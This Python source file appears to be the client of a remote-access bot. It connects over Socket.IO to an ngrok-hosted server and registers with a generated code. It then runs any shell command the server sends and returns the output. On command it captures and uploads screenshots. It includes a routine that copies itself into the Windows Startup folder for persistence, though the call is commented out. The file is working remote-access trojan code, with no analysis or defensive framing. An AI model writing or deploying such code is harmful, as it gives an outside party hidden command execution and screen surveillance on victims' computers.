import socketio
from cmd_executer import execute_shell_command
import requests
from screenshot_utility import *
from init_code_generator import *
import atexit
import sys
import getpass
from shutil import copy


        
SERVER_URL = 'https://c43d-89-178-159-143.ngrok.io'

sio = socketio.Client()

@sio.event
def handle_bot_command(command):
    print(command)
    if(command == 'screenshot'):
        sio.emit('command_response', str(initialization_code) + ' ' + 'screenshot' + ' ' + get_screenshot_as_string('30.jpeg'))
        return
    try:
        response = execute_shell_command(command)
    except:
        response = "Unknown command"
    else:
        if(len(response) > 2500 or len(response) == 0):
            response = ">> Wrong response"
    sio.emit('command_response', str(initialization_code) + ' ' + response)

@sio.event
def handle_reinitialization(data):
    print('Initialization reset!')
    initialize_client()
    sio.emit('command_response', str(initialization_code) + ' ')

def initialize_client():
    requests.post('{}/add-pending-client'.format(SERVER_URL), data={'init_code': str(initialization_code)})
    print('Added to pending clients...')
    requests.post('{}/wait-for-initialization'.format(SERVER_URL), data={'init_code': str(initialization_code)})
    print('Initialized')

def add_to_startup():
    copy(sys.argv[0],'C:/Users/' + getpass.getuser() + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
    
def main():
    # add_to_startup()
    sio.connect(SERVER_URL)
    # On program exit remove active client on server
    atexit.register(lambda: requests.post('{}/remove-client'.format(SERVER_URL), data={'init_code': str(initialization_code)}))

    global initialization_code
    initialization_code = generate_init_code()
    print("Init code: ", initialization_code)

    initialize_client()

    sio.emit('command_response', str(initialization_code) + ' ')
    
    while True:
        pass

main()



